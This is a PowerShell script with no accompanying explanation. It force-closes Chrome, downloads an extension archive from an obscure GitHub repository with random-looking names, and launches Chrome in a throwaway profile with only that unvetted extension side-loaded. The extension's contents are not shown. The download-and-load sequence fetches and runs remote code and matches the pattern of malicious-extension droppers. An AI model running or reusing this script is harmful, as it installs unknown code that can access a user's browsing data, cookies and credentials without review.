# Kill all existing Chrome processes
Get-Process chrome -ErrorAction SilentlyContinue | ForEach-Object {
    try {
        Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
    } catch {}
}

# Set variables
$extension_url = "https://github.com/k53xupn43/i965652f/raw/refs/heads/main/extension.zip"
$tempDir = "$env:TEMP\ExtensionLoadTemp_$([guid]::NewGuid().ToString())"
$zipPath = Join-Path $tempDir "extension.zip"
$extension_path = Join-Path $tempDir "unzipped"
$chromePath = "C:\Program Files\Google\Chrome\Application\chrome.exe"
$chrome_profile_path = Join-Path $tempDir "ChromeProfile"

# Create temp directory
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null

try {
    Write-Host "`n[+] Downloading extension..." -ForegroundColor Cyan
    Invoke-WebRequest -Uri $extension_url -OutFile $zipPath -UseBasicParsing -ErrorAction Stop

    Write-Host "[+] Extracting using .NET method..." -ForegroundColor Cyan
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $extension_path)

    # Find manifest.json in extracted folders
    $manifestPath = Get-ChildItem -Path $extension_path -Recurse -Filter "manifest.json" -File -ErrorAction SilentlyContinue | Select-Object -First 1
    if (-not $manifestPath) {
        Write-Host "[X] manifest.json not found" -ForegroundColor Red
        exit
    }

    $extension_folder = Split-Path $manifestPath.FullName -Parent
    Write-Host "[+] Found manifest.json in: $extension_folder" -ForegroundColor Green

    # Validate manifest
    try {
        $json = Get-Content -Path $manifestPath.FullName -Raw | ConvertFrom-Json
        Write-Host "[+] manifest.json is valid JSON" -ForegroundColor Green
    } catch {
        Write-Host "[X] manifest.json is not valid JSON" -ForegroundColor Red
        exit
    }

    # Create new user profile dir
    New-Item -ItemType Directory -Path $chrome_profile_path -Force | Out-Null

    Write-Host "[+] Launching Chrome with extension..." -ForegroundColor Cyan
    Start-Process -FilePath $chromePath -ArgumentList "--user-data-dir=`"$chrome_profile_path`" --load-extension=`"$extension_folder`" --no-first-run --disable-extensions-except=`"$extension_folder`""

} catch {
    Write-Host "`n[X] Error: $_" -ForegroundColor Red
    Write-Host "Temp files kept at $tempDir for debugging." -ForegroundColor Yellow
}
